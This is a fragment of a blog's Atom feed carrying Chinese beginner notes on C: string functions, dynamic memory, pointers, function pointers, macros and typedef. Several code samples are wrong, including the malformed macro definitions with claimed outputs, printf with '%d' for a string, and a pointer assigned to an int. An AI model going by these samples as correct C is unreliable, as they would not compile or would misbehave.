title="字符串的输入"></a>字符串的输入</h3><p>3种方法从控制台接收字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//三种从控制台获取输入的途径：gets/fgets/scanf</span></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">50</span>];</span><br><span class="line"><span class="comment">//gets 默认以回车的方式结束输入</span></span><br><span class="line"><span class="comment">//gets(str);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fgets接收3个参数，存放字符串的位置，接收字符串的长度，接收模式    与gets的区别在于会接收回车，能控制接收大小</span></span><br><span class="line"><span class="comment">//fgets(str,50,stdin);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//scanf通过格式化输入来控制输入长度</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%5s"</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串的输出"><a href="#字符串的输出" class="headerlink" title="字符串的输出"></a>字符串的输出</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello\n"</span>&#125;;</span><br><span class="line"><span class="comment">//两种方式：puts printf</span></span><br><span class="line"><span class="built_in">puts</span>(str);<span class="comment">//自带换行</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算字符串长度"><a href="#计算字符串长度" class="headerlink" title="计算字符串长度"></a>计算字符串长度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="comment">//字符串操作一般都包含进去，会用得上</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串以00或者\0结尾，真实长度比输出来的长度要多1</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> a = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a=%d"</span>, a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//字符串拼接的两个函数：strcat,strncat</span></span><br><span class="line"><span class="comment">//strcat接收两个参数：目的字符串，源字符串，将源字符串拷贝到目的字符串后面，存到目的字符串里</span></span><br><span class="line"><span class="comment">//strncat接收三个参数：目的字符串，源字符串，接收长度，将指定长度的源字符串拷贝到目的字符串后面，存到目的字符串里</span></span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"hello "</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"world \n"</span>;</span><br><span class="line"><span class="comment">//strcat(str1, str2);</span></span><br><span class="line"><span class="comment">//printf("%s", str1);</span></span><br><span class="line"><span class="built_in">strncat</span>(str1, str2,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str1);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串对比"><a href="#字符串对比" class="headerlink" title="字符串对比"></a>字符串对比</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//strcmp strcnmp</span></span><br><span class="line"><span class="comment">//strcmp接收两个参数：待比较的两个字符串，返回0表示相等，返回其他值表示不相等</span></span><br><span class="line"><span class="comment">//strncmp接收三个参数，待比较的两个字符串和比对的字符数（从头往后数）,返回值同上</span></span><br><span class="line"><span class="keyword">char</span> str1[] = <span class="string">"hello"</span>;</span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//res = strcmp(str1, str2);//-1</span></span><br><span class="line">res = <span class="built_in">strncmp</span>(str1, str2, <span class="number">5</span>);<span class="comment">//0</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, res);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串拷贝"><a href="#字符串拷贝" class="headerlink" title="字符串拷贝"></a>字符串拷贝</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//strcpy strncpy</span></span><br><span class="line"><span class="comment">//strcpy接收两个参数：目的字符串和源字符串，将源字符串的东西拷贝到目的字符串里</span></span><br><span class="line"><span class="comment">//strncpy比上面多接收一个参数，拷贝的字符数</span></span><br><span class="line"><span class="keyword">char</span> str1[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//这里需要用0初始化，因为字符串找到0才结尾，打印的时候会出现烫烫烫烫烫烫</span></span><br><span class="line"><span class="keyword">char</span> str2[] = <span class="string">"hello world"</span>;</span><br><span class="line"><span class="comment">//strcpy(str1, str2);</span></span><br><span class="line"><span class="built_in">strncpy</span>(str1, str2,<span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, str1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//sprintf：将printf格式化输出的结果保存到字符串里</span></span><br><span class="line"><span class="comment">//接收三个参数，一个是目标字符串，2是格式化格式，3是格式化内容</span></span><br><span class="line"><span class="keyword">char</span> str[] = &#123;<span class="string">"hello"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s,%d\n"</span>, str, n);</span><br><span class="line"><span class="keyword">char</span> str0[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(str0, <span class="string">"%s,%d\n"</span>, str, n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,str0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两个输出是一样的</span></span><br></pre></td></tr></table></figure><h3 id="动态内存管理"><a href="#动态内存管理" class="headerlink" title="动态内存管理"></a>动态内存管理</h3><p>三步骤：</p><ol><li>申请内存  malloc,memset</li><li>使用内存  </li><li>释放内存  free</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> * str;</span><br><span class="line"><span class="comment">//malloc在堆上面申请内存，返回的是void *</span></span><br><span class="line">str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="comment">//memset,把一段内存地址刷成你想要的的值</span></span><br><span class="line"><span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="number">200</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">strcpy</span>(str, <span class="string">"asdjaljfalkjas"</span>);</span><br><span class="line"><span class="comment">//free 释放内存</span></span><br><span class="line"><span class="built_in">free</span>(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础05–字符串操作&quot;&gt;&lt;a href=&quot;#C语言基础05–字符串操作&quot; class=&quot;headerlink&quot; title=&quot;C语言基础05–字符串操作&quot;&gt;&lt;/a&gt;C语言基础05–字符串操作&lt;/h1&gt;&lt;h3 id=&quot;字符串的声明&quot;&gt;&lt;a href=&quot;#字符串
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础04--指针</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/</id>
    <published>2020-05-16T02:40:50.000Z</published>
    <updated>2020-05-16T16:52:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础04–指针"><a href="#C语言基础04–指针" class="headerlink" title="C语言基础04–指针"></a>C语言基础04–指针</h1><h3 id="指针与变量之间的关系"><a href="#指针与变量之间的关系" class="headerlink" title="指针与变量之间的关系"></a>指针与变量之间的关系</h3><p>*：指针运算符，跟在变量前表示指向地址的值</p><p>&amp;：取地址运算符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">int</span> * b = &amp;a; <span class="comment">//指什么类型的地址，声明什么类型的指针</span></span><br><span class="line">  <span class="comment">//这里是把a的地址给b</span></span><br><span class="line">*b = <span class="number">666</span>;</span><br><span class="line"><span class="comment">//a指的是地址上的值</span></span><br><span class="line"><span class="comment">//b指的是地址</span></span><br><span class="line"><span class="comment">//&amp;a指的是地址</span></span><br><span class="line"><span class="comment">//*b指的是地址上的值</span></span><br><span class="line">a = <span class="number">567</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在汇编中</span></span><br><span class="line"><span class="comment">//mov dword ptr [a] ,2F6ah</span></span><br><span class="line"><span class="comment">//dword 是数据长度，4字节</span></span><br><span class="line"><span class="comment">//ptr 指针</span></span><br><span class="line"><span class="comment">//a    a的地址</span></span><br><span class="line"><span class="comment">//[a]  a的值</span></span><br></pre></td></tr></table></figure><h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//数组是内存地址中连续的存储空间</span></span><br><span class="line"><span class="comment">//数组的名字指向数组首地址</span></span><br><span class="line"><span class="keyword">int</span> n[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> * a = n;<span class="comment">//a就是数组首地址，*a的值为1</span></span><br><span class="line"><span class="keyword">int</span> b = *(a + <span class="number">1</span>);<span class="comment">//这里+1指的是+1个int类型的长度</span></span><br><span class="line"> <span class="comment">//(a+1)相当于是数组下一位的地址，然后前面跟上*来取地址的值</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针与函数"><a href="#指针与函数" class="headerlink" title="指针与函数"></a>指针与函数</h3><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//指针函数是函数,指针类型的函数，返回值也是指针</span></span><br><span class="line"><span class="comment">//函数指针是指针，指向函数的指针</span></span><br><span class="line"><span class="keyword">int</span>(*mysub)(<span class="keyword">int</span> a, <span class="keyword">int</span> b);<span class="comment">//函数指针</span></span><br><span class="line">mysub = sub;<span class="comment">//不带括号不带参数的函数名是函数的首地址</span></span><br><span class="line"><span class="keyword">int</span> c = mysub(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 调用的时候，mysub指向跳转表的sub，然后跳转表指向函数的sub</span></span><br><span class="line"><span class="keyword">int</span> d = sub(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 调用的时候，sub也先指向跳转表的sub，然后跳转表指向函数sub</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> * <span class="title">ret</span><span class="params">(<span class="keyword">int</span> * a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">3</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> a = &amp;b[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> * c = ret(a);<span class="comment">//这里的c是地址，是a的地址,也就是把函数返回的地址给c</span></span><br><span class="line"><span class="keyword">int</span> d = *c;<span class="comment">//*c是a的地址的值</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> * <span class="title">ret</span><span class="params">(<span class="keyword">int</span> * a)</span> </span>&#123;<span class="comment">//传入一个地址作为参数</span></span><br><span class="line"><span class="keyword">int</span> b = a;<span class="comment">//a为地址</span></span><br><span class="line"><span class="keyword">int</span> c = *a;<span class="comment">//*a为a的值</span></span><br><span class="line"><span class="keyword">return</span> a;<span class="comment">//返回的是a的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础04–指针&quot;&gt;&lt;a href=&quot;#C语言基础04–指针&quot; class=&quot;headerlink&quot; title=&quot;C语言基础04–指针&quot;&gt;&lt;/a&gt;C语言基础04–指针&lt;/h1&gt;&lt;h3 id=&quot;指针与变量之间的关系&quot;&gt;&lt;a href=&quot;#指针与变量之间的关系&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础03--宏&amp;函数&amp;数组</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&amp;%E5%87%BD%E6%95%B0&amp;%E6%95%B0%E7%BB%84/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&amp;%E5%87%BD%E6%95%B0&amp;%E6%95%B0%E7%BB%84/</id>
    <published>2020-05-16T00:40:50.000Z</published>
    <updated>2020-05-16T16:52:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础03–宏-amp-函数-amp-数组"><a href="#C语言基础03–宏-amp-函数-amp-数组" class="headerlink" title="C语言基础03–宏&amp;函数&amp;数组"></a>C语言基础03–宏&amp;函数&amp;数组</h1><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><p>预先定义一个东西，编译的时候被替换掉，有点常量的感觉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nNUm = 10; <span class="comment">//宏，类似于常量，无参数宏</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> add (a+b); <span class="comment">//表达式，无参数宏</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a&gt;b)?(a):(b)) <span class="comment">//三元运算符，有参数宏</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,add);<span class="comment">//3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="built_in">max</span>(a,b));<span class="comment">//2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a+nNum); <span class="comment">//11</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h3><p>给类型起别名,define宏也能达到类似的效果，但是不能处理指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">typedef int df;</span><br><span class="line">df a&#x3D;1;</span><br><span class="line">printf(&quot;%d&quot;,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">//函数声明,函数位于main函数之下，必须在上面声明一下</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">11</span>, b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">c = add(a, b);<span class="comment">//33</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a ,<span class="keyword">int</span> b)</span> </span>&#123;  <span class="comment">//函数定义</span></span><br><span class="line"><span class="keyword">return</span> a + b;<span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>自己嵌套自己</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> n)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">5</span>;</span><br><span class="line">func1(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span 